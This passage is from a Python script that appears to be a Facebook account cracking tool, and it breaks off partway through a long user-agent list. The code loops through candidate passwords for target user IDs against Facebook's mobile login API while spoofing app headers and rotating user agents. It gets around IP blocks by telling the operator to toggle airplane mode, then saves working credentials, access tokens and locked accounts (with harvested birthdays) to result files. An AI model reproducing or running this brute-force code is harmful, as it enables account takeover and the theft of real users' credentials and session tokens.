    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            header = {
            "user-agent": ua,
            "x-fb-connection-bandwidth": str(random.randint(20000,40000)),
            "x-fb-sim-hni": str(random.randint(20000,40000)),
            "x-fb-net-hni": str(random.randint(20000,40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"
            }
            bapi = "https://b-api.facebook.com/v1.0/method/auth.login?format=json&email=&password=&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
            response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
            	loop +=1
            	print ("\r\033[0;91m[!] IP terblokir. hidupkan mode pesawat 2 detik"),
                sys.stdout.flush()
                b_api(self, user, zona)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r%s--> %s | %s | %s ' % (H,user,pw,response.json()['access_token'])
                ok.append('%s|%s|%s' % (user,pw,response.json()['access_token']))
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s|%s|%s\n'%(user,pw,response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r%s--> %s | %s | %s %s %s  ' % (K,user,pw,day,month,year)
                    cp.append("%s|%s|%s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("%s|%s|%s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r%s--> %s | %s           ' % (K,user,pw)
                cp.append('%s|%s' % (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("%s|%s\n"%(user,pw))
                break
                continue
        loop += 1
        #rm = random.choice(["\033[1;97m","\033[1;96m","\033[1;95m","\033[1;94m","\033[1;93m","\033[1;92m","\033[1;91m"])
        print('\r\x1b[0;97m[\x1b[0;92m%s\x1b[0;97m] \x1b[0;93m%s/%s \x1b[0;92mOk/%s \x1b[0;97m- \x1b[0;93mCp/%s > '%(datetime.now().strftime('%H:%M:%S'),loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def basic(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua=random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','NokiaC3-00/5.0 (07.80) Profile/MIDP-2.1 Configuration/CLDC-1.1/UC Browser7.0.0.41/27/400,Mozilla/5.0 (Linux; Android 5.1; en-US; E5533 Build/29.1.B.0.101) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Noki630/1.0 SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1/UC Browser7.0.0.41/27/400','Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9505 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36','NokiaX2-02/2.0 (11.79) Profile/MIDP-2.1 Configuration/CLDC-1.1','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2) UCBrowser8.4.0.159/70/352','NokiaX2-02/2.0 (11.79) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0(Java; U; MIDP-2.0; en-us; nokiax2-02) U2/1.0.0 UCBrowser/8.7.1.234 U2/1.0.0 Mobile UNTRUSTED/1.0','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; vivo Y53 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/8.6.12.9','Mozilla/5.0 (Linux; Android 8.1; DUA-L22 Build/HONORDUA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-G610Y Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; vi; SM-G610F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.0; en-US; ASUS_Z00AD Build/LRX21V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.2.599 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/264.0.0.44.111;]','Mozilla/5.0 (Linux; U; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/52.2.2254.54723','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Redmi Note 9S Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/327.0.0.33.120;]','Mozilla/5.0 (Linux; U; Android 10; en-in; Redmi Note 9 Pro Max Build/QKQ1.191215.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.9.3-gc','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; NOKIA; Lumia 730 Dual SIM) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/48.0.2564.82 Mobile Safari/537.36 Tepi/14.14332','Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; WebBrowser/8.1; IEMobile/11.0; NOKIA; Lumia 525) like Gecko UCBrowser/4.2.1.541 Mobile','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Nokia; Lumia 520) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10570','Opera/9.80 (Android; Opera Mini/12.0.1987/37.7327; U; pl) Presto/2.12.423 Version/12.16','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0','Mozilla/5.0 (Linux; Android 9; Huawei P20 Lite Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/307.0.0.40.111;]','Mozilla/5.0 (Linux; U; Android 4.1.3; ru-RU; Nokia_X Build/GRK39F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; Android 4.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 YaBrowser/17.3.1.383.00 Mobile Safari/E7FBAF]','Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; Android 6.0; Redmi 4 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 YaBrowser/17.3.1.383.00 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; U; Android 9; ru-ru; Redmi 7A Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.9.3-g','Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Tizen 2.2; SAMSUNG SM-Z9005) AppleWebKit/537.3 (KHTML, like Gecko) Version/2.2 like Android 4.1; Mobile Safari/537.3','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.13014 YaBrowser/13.12.1599.13014 Safari/537.3','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.12785 YaBrowser/13.12.1599.12785 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D100 Safari/604.5.6','Mozilla/5.0 (Linux; Android 8.1.0; BBF100-2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 GSA/4.6.10.19.arm64[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 GSA/4.6.10.19.arm64[FB_IAB/FB4A;FBAV/127.0.0.22.69','Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 GSA/4.6.10.19.arm64','Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 PHX/4.7','Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 PHX/4.7[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 PHX/4.7[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/537.36 PHX/4.7','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136','Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36','Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.32052/29.3638; U; en) Presto/2.8.119 Version/11.10','SAMSUNG-GT-C3312R Opera/9.80 (J2ME/MIDP; Opera Mini/7.0.32584/144.30; U; en) Presto/2.12.423 Version/12.16','Mozilla/5.0 (Linux; U; Android 4.2.2; de-de; GT-I8200N Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; de-de; GT-P5110 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30','Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36 OPR/44.6.2246.127414','Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)','Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/159.0.0.38.95;]','Mozilla/5.0 (Linux; Android 11; SM-F916B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Safari/537.36[FB_IAB/FB4A;FBAV/311.0.0.44.117;]','NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1','Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Browser Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019)[FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;] FBBK/1','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 8.1.0; Xperia Z3 Tablet Compact LTE Build/OPM8.190305.001; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.0(20416) Chrome/76.0.3809.111 Safari/537.36','Mozilla/5.0 (Linux; Android 10; Xperia Z3 Compact) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/60.3.3004.55692','Mozilla/5.0 (Linux; Android 9; Xperia Z3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-S367VL Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36[FB_IAB/Orca-Android;FBAV/222.0.0.15.124;]','Mozilla/5.0 (Linux; Android 9; Xperia XZ1 Build/47.2.A.11.228; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/286.0.0.48.112;]','Mozilla/5.0 (Linux; Android 9; Xperia XZ1 Build/47.2.A.11.228; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/290.0.0.44.121;]','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4501.0 Safari/537.36 Edg/91.0.866.0','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Mobile Safari/537.36 Edg/90.0.818.46','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 KHTML, like Gecko) Chrome/80.0.3987.122 Mobile Safari/537.','Mozilla/5.0 (Linux; Android 8.0.0; Nokia 3.1 Build/O00623) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/12.9.10.1166 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 10; SM-T295 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/330.0.0.31.120;]','Mozilla/5.0 (Linux; Android 11; SM-A715F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.164 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/330.0.0.31.120;]','Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148[FBAN/MessengerForiOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/12.2;FBSS/3;FBCR/Tele2;FBID/phone;FBLC/ru_RU;FBOP/5]','Mozilla/5.0 (Linux; Android 5.0; Lenovo A1000 Build/S100; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36[FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]','Mozilla/5.0 (Linux; Android 7.0; Infinix HOT 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36[FB_IAB/MESSENGER;FBAV/114.0.0.21.71;]','Mozilla/5.0 (Linux; Android 11.0.1; HUAWEI P30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36','Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; Huawei; H883G; HuaweiH883G)','Mozilla/5.0 (Linux; Android 11.0.1; HUAWEI P30 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/229.0.0.35.117;]','Mozilla/5.0 (Linux; Android 7.0; TRT-L21A Build/HUAWEITRT-L21A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; TRT-L21A Build/HUAWEITRT-L21A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/229.0.0.35.117;]','Mozilla/5.0 (Linux; Android 9; RMX2030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; RMX2030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Realme 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.29 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 4.4.4; SM-G530H Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 CoolBrowser/33.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 4.4.1; ru-RU; SM-S920L Build/KOT49E) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.9.2.467 U3/0.8.0 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; Android 5.1.1; SM-G531H) AppleWebKit/537.36 (KHTML, 